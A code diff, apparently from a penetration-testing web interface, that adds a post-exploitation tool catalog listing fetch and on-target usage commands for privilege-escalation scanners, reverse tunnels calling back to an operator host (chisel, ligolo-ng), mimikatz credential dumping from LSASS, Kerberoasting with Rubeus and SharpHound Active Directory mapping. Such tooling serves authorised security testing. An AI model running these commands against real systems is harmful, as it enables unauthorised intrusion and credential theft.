@@ -619,3 +619,149 @@ export function PivotGuide({ lhost, port, targetIp }: { lhost: string; port: num
     </div>
   );
 }
+
+// Post-exploitation tool catalog
+type ToolEntry = {
+  name: string;
+  desc: string;
+  platform: "linux" | "windows" | "both";
+  fetchCmd: string;
+  remotePath: string;
+  usage: string;
+  size?: string;
+};
+
+const TOOL_ENTRIES: ToolEntry[] = [
+  {
+    name: "linpeas.sh",
+    desc: "Linux privilege escalation audit — checks sudo, SUID, cron, configs, CVEs",
+    platform: "linux",
+    fetchCmd: "curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh",
+    remotePath: "/tmp/linpeas.sh",
+    usage: "bash /tmp/linpeas.sh -a 2>&1 | tee /tmp/linpeas.out",
+    size: "~800KB",
+  },
+  {
+    name: "winPEAS.exe",
+    desc: "Windows privilege escalation audit — services, tokens, credentials, registry",
+    platform: "windows",
+    fetchCmd: "curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe -o /tmp/winPEAS.exe",
+    remotePath: "C:\\Windows\\Temp\\winPEAS.exe",
+    usage: "C:\\Windows\\Temp\\winPEAS.exe quiet",
+    size: "~2MB",
+  },
+  {
+    name: "pspy64",
+    desc: "Process monitor without root — watches cron, services, other users' commands",
+    platform: "linux",
+    fetchCmd: "curl -fsSL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /tmp/pspy64 && chmod +x /tmp/pspy64",
+    remotePath: "/tmp/pspy64",
+    usage: "/tmp/pspy64 -pf",
+    size: "~3MB",
+  },
+  {
+    name: "chisel",
+    desc: "TCP/UDP tunnel — reverse SOCKS proxy, port forwarding through firewalls",
+    platform: "both",
+    fetchCmd: "curl -fsSL https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz | gunzip > /tmp/chisel && chmod +x /tmp/chisel",
+    remotePath: "/tmp/chisel",
+    usage: "# On YOUR box: chisel server --reverse --port 8888\n# On target: /tmp/chisel client YOUR_IP:8888 R:socks",
+    size: "~8MB",
+  },
+  {
+    name: "ligolo-ng agent",
+    desc: "Layer-3 tunnel — full network access to target's subnet without SOCKS config",
+    platform: "both",
+    fetchCmd: "curl -fsSL https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-agent_linux_amd64 -o /tmp/ligolo-agent && chmod +x /tmp/ligolo-agent",
+    remotePath: "/tmp/ligolo-agent",
+    usage: "# On YOUR box: ligolo-proxy -selfcert -laddr 0.0.0.0:11601\n# On target: /tmp/ligolo-agent -connect YOUR_IP:11601 -ignore-cert",
+    size: "~5MB",
+  },
+  {
+    name: "mimikatz.exe",
+    desc: "Windows credential dumper — SAM, LSASS, tickets, DPAPI (needs admin)",
+    platform: "windows",
+    fetchCmd: "curl -fsSL https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip -o /tmp/mimikatz.zip",
+    remotePath: "C:\\Windows\\Temp\\mimikatz.exe",
+    usage: "C:\\Windows\\Temp\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
+    size: "~1.5MB",
+  },
+  {
+    name: "Rubeus.exe",
+    desc: "Kerberos abuse — roasting, delegation, ticket operations (needs AD)",
+    platform: "windows",
+    fetchCmd: "# Build from https://github.com/GhostPack/Rubeus or use pre-compiled",
+    remotePath: "C:\\Windows\\Temp\\Rubeus.exe",
+    usage: "C:\\Windows\\Temp\\Rubeus.exe kerberoast /outfile:C:\\Windows\\Temp\\hashes.txt",
+    size: "~400KB",
+  },
+  {
+    name: "SharpHound.exe",
+    desc: "BloodHound collector — maps AD trust, ACLs, sessions for attack paths",
+    platform: "windows",
+    fetchCmd: "# Download from https://github.com/BloodHoundAD/SharpHound/releases",
+    remotePath: "C:\\Windows\\Temp\\SharpHound.exe",
+    usage: "C:\\Windows\\Temp\\SharpHound.exe --collectionmethods All --outputdirectory C:\\Windows\\Temp",
+    size: "~1MB",
+  },
+];
+
+export function ToolCatalog() {
+  const [platform, setPlatform] = useState<"linux" | "windows">("linux");
+  const [copied, setCopied] = useState<string | null>(null);
+
+  const filtered = TOOL_ENTRIES.filter(t => t.platform === platform || t.platform === "both");
+
+  const copy = (text: string, key: string) => {
+    navigator.clipboard?.writeText(text);
+    setCopied(key);
+    setTimeout(() => setCopied(null), 1200);
+  };
+
+  return (
+    <div className="tool-catalog">
+      <div className="postex-tabs">
+        <button className={`postex-tab ${platform === "linux" ? "active" : ""}`}
+                onClick={() => setPlatform("linux")}>Linux</button>
+        <button className={`postex-tab ${platform === "windows" ? "active" : ""}`}
+                onClick={() => setPlatform("windows")}>Windows</button>
+      </div>
+      <div className="tool-list">
+        {filtered.map(t => {
+          const fetchLine = t.fetchCmd.startsWith("#")
+            ? (t.fetchCmd.split("\n")[1] || t.fetchCmd)
+            : t.fetchCmd;
+          const usageLine = t.usage.split("\n")[0];
+          return (
+            <div key={t.name} className="tool-card">
+              <div className="tool-card-h">
+                <span className="tool-name">{t.name}</span>
+                {t.size && <span className="muted small">{t.size}</span>}
+              </div>
+              <div className="tool-desc muted">{t.desc}</div>
+              <div className="tool-actions">
+                <div className="tool-cmd-row">
+                  <span className="tool-cmd-label">Fetch to Kali:</span>
+                  <code className="tool-cmd-code">{fetchLine}</code>
+                  <button className="copy" onClick={() => copy(t.fetchCmd, t.name + "-fetch")}>
+                    {copied === t.name + "-fetch" ? "✓" : "copy"}
+                  </button>
+                </div>
+                <div className="tool-cmd-row">
+                  <span className="tool-cmd-label">Usage on target:</span>
+                  <code className="tool-cmd-code">{usageLine}</code>
+                  <button className="copy" onClick={() => copy(t.usage, t.name + "-use")}>
+                    {copied === t.name + "-use" ? "✓" : "copy"}
+                  </button>
+                </div>
+              </div>
+            </div>
+          );
+        })}
+      </div>
+      <div className="tool-tip muted small">
+        Download tools to your Kali box first, then use the Upload button above to push them to the target through the shell (max ~5 MB).
+      </div>
+    </div>
+  );
+}
